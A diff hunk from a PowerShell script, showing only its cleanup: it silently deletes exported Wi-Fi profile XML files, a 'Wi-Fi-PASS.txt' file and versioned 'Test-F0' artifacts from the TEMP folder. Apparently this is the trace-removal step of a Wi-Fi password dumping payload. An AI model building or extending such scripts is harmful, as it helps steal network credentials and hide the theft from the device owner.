@@ -15,7 +15,7 @@ Get-ChildItem -Path "$env:TEMP" -Filter "Wi*.xml" -Force | Remove-Item -Force -E
 Remove-Item -Path "$env:TEMP\Wi-Fi-PASS.txt" -Force -ErrorAction SilentlyContinue
 
 # Clean up other temporary files
-Remove-Item -Path "$env:TEMP\Test-F0-3.0.zip" -Force -ErrorAction SilentlyContinue
-Remove-Item -Path "$env:TEMP\Test-F0-3.0" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "$env:TEMP\Test-F0-4.0.zip" -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "$env:TEMP\Test-F0-4.0" -Recurse -Force -ErrorAction SilentlyContinue
 
 exit
